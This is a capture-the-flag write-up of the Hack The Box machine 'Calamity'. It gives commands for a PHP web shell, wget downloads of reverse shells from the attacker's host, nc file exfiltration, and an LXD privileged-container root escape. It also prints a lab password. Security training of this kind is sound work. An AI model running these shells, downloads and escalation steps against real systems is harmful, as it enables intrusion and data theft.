
![logo](/logo.png)

# [Calamity- BOX]  
Hi folks, today I am going to solve an Hard rated hack the box machine which was released on 23 Jun 2017 as the 21st machine on HTB,Calamity created by [forGP](https://app.hackthebox.com/users/198) without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *ssh
  *OverflowBuffer
###### code-nmap

```code
nmap -sV -sC -oA nmap/calamity 10.10.10.27
```

###### Output 

![](/Linux/Linux-Hard/Calamity/Screenshots/nmap.png)

```sh
 nmap -sV -sC -oA nmap/calamity 10.10.10.27                                                                                        ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-25 11:31 EAT
Nmap scan report for 10.10.10.27
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:46:31:9c:b5:71:c5:96:91:7d:e4:63:16:f9:59:a2 (RSA)
|   256 10:c4:09:b9:48:f1:8c:45:26:ca:f6:e1:c2:dc:36:b9 (ECDSA)
|_  256 a8:bf:dd:c0:71:36:a8:2a:1b:ea:3f:ef:66:99:39:75 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Brotherhood Software
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.26 seconds
```

looking at the results  we find out that there are 2 ports open and its a `Ubuntu`and its running an `Apache httpd 2.4.18`.  

port[22]-ssh
port[80]-tcp

when we naviagate to [http://10.10.10.27](http://10.10.10.27)  we find a page of brotherhood software

![](/Linux/Linux-Hard/Calamity/Screenshots/browser.png)

i start `gobuster` to enemerate directories sinces it seems that i can not find anything 

```sh
gobuster dir -u http://10.10.10.27 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php -t 50
```

it revels an `admin.php` and an `upload` directory

![](/Linux/Linux-Hard/Calamity/Screenshots/gobuster.png)

when we navigate to the admin we find a login form

![](/Linux/Linux-Hard/Calamity/Screenshots/admin.png)

so we start `burp` so that we can be able to see how the request is passed but when we send with the wrong credentials we find the password which has been commented out in the code source

![](/Linux/Linux-Hard/Calamity/Screenshots/burp.png)

we use the credential of the password and the username as admin and boom we get in 

![](/Linux/Linux-Hard/Calamity/Screenshots/admiiin.png)

# Exploitation

we find the name of the boss `xalvas`  so as per the information lets execute a html and test also php

![](/Linux/Linux-Hard/Calamity/Screenshots/html.png)

we find that the html can be executed. so lets test with php.

```sh
<?php system("ls");?>
```

![](/Linux/Linux-Hard/Calamity/Screenshots/php.png)

php is also executed now we can upload a shell their was an Upload folder and exetute it from their as `shell.php`

```sh
<?php system($_GET["cmd"]); ?>
```

Then we upload the shell to the uploads folder by but first we set a listner 


```sh
<?php system("wget http://10.10.14.15:8000/shell.php -P uploads;"); ?>
```

![](/Linux/Linux-Hard/Calamity/Screenshots/listerner.png)

then when we go to the uploads folder and execute the cmd we get that it has been uploaded 

![](/Linux/Linux-Hard/Calamity/Screenshots/whoami.png)

now we use this so as to upload a reverse shell into our the box in the `tmp` folder.

```sh
wget http://10.10.14.15:8000/revshell.php -P /tmp
```

![](/Linux/Linux-Hard/Calamity/Screenshots/wget.png)

we see that it has uploaded just by looking at out listner

![](/Linux/Linux-Hard/Calamity/Screenshots/revshell.png)

lets confirm and execute the bash 

```sh
bash -f /tmp/shell.php
```

![](/Linux/Linux-Hard/Calamity/Screenshots/shellnot.png)

it exectes then it closes the conncection so it seems we will have just to upload the shell to the upload it shell so that we can execte it via uploads. i use [PHP reverse shell ](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)  

```sh
<?php system("wget http://10.10.14.15:8000/php-reverse-shell.php -P uploads;"); ?>
```

![](/Linux/Linux-Hard/Calamity/Screenshots/phprevershell.png)

Then we use the `shell.php`  to run the revershell

```sh
php php-reverse-shell.php
```


![](/Linux/Linux-Hard/Calamity/Screenshots/runningshell.png)

then just like that we get a  stable shell

![](/Linux/Linux-Hard/Calamity/Screenshots/shell.png)

## Takeover
 After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
#### code-stty
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 [ctrl] + z
 stty raw -echo ; fg
 ```

```sh
export TERM=screen-256color
export SHELL=bash
stty rows 29 cols 135
reset
```

to check for colums and rows in you machine run

```sh
stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
```

![](/Linux/Linux-Hard/Calamity/Screenshots/stty.png)

you can get the `user flag` from 

![](/Linux/Linux-Hard/Calamity/Screenshots/userflag.png)

# Privillage Escalation

In `/home/xalvas` there is a `recov.wav` file. There is also an `alarmclocks` directory which contains a `rick.wav` file. lets send this to our machine as you can see i tried with a lot of nc it was being killed but eventually the last one was able to get me the file

```sh
nc 10.10.14.15 9000 < recov.wav
```

![](/Linux/Linux-Hard/Calamity/Screenshots/nc.png)

![](/Linux/Linux-Hard/Calamity/Screenshots/reco.png)

so lets confirm the the files to see that we have not tampared with anything

```sh
md5sum recov.wav
```

![](/Linux/Linux-Hard/Calamity/Screenshots/md51.png)

so when i did that i was not copyint the wohole of the file so i decide to do this instead

```sh
curl -s -G http://10.10.10.27/admin.php --data-urlencode "html=<?php system(\"cat /home/xalvas/recov.wav\"); ?>" --cookie adminpowa=noonecares | sed -e '1,/<\/body><\/html>/ d' > recov.wav
```

![](/Linux/Linux-Hard/Calamity/Screenshots/md52.png)


so lets do it to the other audio file `rick.wav` and  

![](/Linux/Linux-Hard/Calamity/Screenshots/cp.png)

so after copying them to my local shared folder am going to listen for them in Audacity to check what i can find 

![](/Linux/Linux-Hard/Calamity/Screenshots/rickroll.png)

we find that its a rick and roll song so lets `invert` one of the audios so that we can analyze again to find what can be gotten when we change the wave

![](/Linux/Linux-Hard/Calamity/Screenshots/Audacity.png)

After inverting we get a `password` the password audio is cut in half, with the start of the password
being at the end of the track. Simply playing the track on a loop will provide the full password. 

we copy the two file side b side of each other and we start from you Password... then 47...

![](/Linux/Linux-Hard/Calamity/Screenshots/passwd.png)

It is possible to SSH in directly as the xalvas user with the obtained password `18547936..*` 

![](/Linux/Linux-Hard/Calamity/Screenshots/ssh.png)

In xalvas’ home directory there’s an `app` folder that I couldn’t access as www-data:

![](/Linux/Linux-Hard/Calamity/Screenshots/app.png)

### Unintended LXD Path

There’s an unintended LXD path for this box.  [LXD Alpine Linux image builder](https://github.com/saghul/lxd-alpine-builder)

```sh
git clone https://github.com/saghul/lxd-alpine-builder
```

![](/Linux/Linux-Hard/Calamity/Screenshots/clone.png)

N/B-Just build a new one because of the architecture

```sh
./build-alpine -a i686
```

```sh
scp alpine-v3.13-x86_64-20210218_0139.tar.gz xalvas@10.10.10.27: 
```

![](/Linux/Linux-Hard/Calamity/Screenshots/cptohtb.png)

Now back to Calamity, I’ll import the image:

```sh
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias leshack-Image
```

![](/Linux/Linux-Hard/Calamity/Screenshots/lxc.png)

their is an information about running `lxd init` first before trying to run the `lxc`

Now, I’ll start the image again. The options breaks down to:

- `init` - action to take, starting a container
- `leshack-Images` - the image to start
- `container-Alpine` - the alias for the running container
- `-c security.privileged=true` - by default, containers run as a non-root UID; this runs the container as root, giving it access to the host filesystem as root

```sh
lxc init leshack-Images container-Alpine -c security.privileged=true
```

![](/Linux/Linux-Hard/Calamity/Screenshots/lxcbuild.png)

so the next thing is to add storage local system root to the container, mapped as `/mnt/root`:

```sh
lxc config device add container-Alpine device-leshack disk source=/ path=/mnt/root
```

Now the container is setup and ready, lets run it :

```sh
lxc start container-Alpine
```

![](/Linux/Linux-Hard/Calamity/Screenshots/lxcrun.png)

so its running now lets get the shell inside the cointainer 

```sh
lxc exec container-Alpine /bin/sh
```

![](/Linux/Linux-Hard/Calamity/Screenshots/root.png)

and we get root. The host root file system is at `/mnt/root`:

![](/Linux/Linux-Hard/Calamity/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley----------------------




